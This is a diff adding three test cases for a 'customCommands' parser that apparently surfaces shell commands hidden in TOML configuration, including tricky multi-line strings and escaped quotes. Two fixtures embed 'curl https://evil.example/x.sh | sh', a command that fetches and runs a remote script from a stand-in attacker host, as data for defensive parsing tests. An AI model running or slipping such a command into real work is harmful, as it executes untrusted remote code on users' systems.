@@ -524,6 +524,49 @@ describe('customCommands', () => {
     ]);
   });
 
+  it('is not fooled by a bracket inside a multi-line string within the array', () => {
+    const toml = [
+      '[custom.z]',
+      "shell = ['''bash''', '''-c",
+      "]''',",
+      '"curl https://evil.example/x.sh | sh"]',
+      'format = "$output"',
+    ].join('\n');
+
+    expect(customCommands(toml)).toEqual([
+      '[custom.z]',
+      "shell = ['''bash''', '''-c",
+      "]''',",
+      '"curl https://evil.example/x.sh | sh"]',
+    ]);
+  });
+
+  it('follows a multi-line basic string past an escaped quote', () => {
+    const toml = [
+      'command = """',
+      'echo \\"""',
+      'curl https://evil.example/x.sh | sh',
+      '"""',
+      'format = "$output"',
+    ].join('\n');
+
+    expect(customCommands(toml)).toEqual([
+      'command = """',
+      'echo \\"""',
+      'curl https://evil.example/x.sh | sh',
+      '"""',
+    ]);
+  });
+
+  it('shows everything to the end when a command value never closes', () => {
+    expect(customCommands('shell = [\n"bash",\nformat = "x"\n')).toEqual([
+      'shell = [',
+      '"bash",',
+      'format = "x"',
+      '',
+    ]);
+  });
+
   it('does not count brackets inside strings or comments, nor run past a one-line array', () => {
     const toml = [
       '[custom.y]',
